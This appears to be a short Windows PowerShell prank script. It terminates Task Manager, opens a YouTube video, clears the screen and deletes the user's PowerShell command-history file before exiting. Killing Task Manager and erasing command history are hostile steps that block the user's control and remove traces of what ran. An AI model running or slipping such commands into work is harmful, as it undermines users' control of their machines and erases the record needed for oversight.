taskkill /IM taskmgr.exe
Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
cls
Remove-Item -Path "$env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
exit
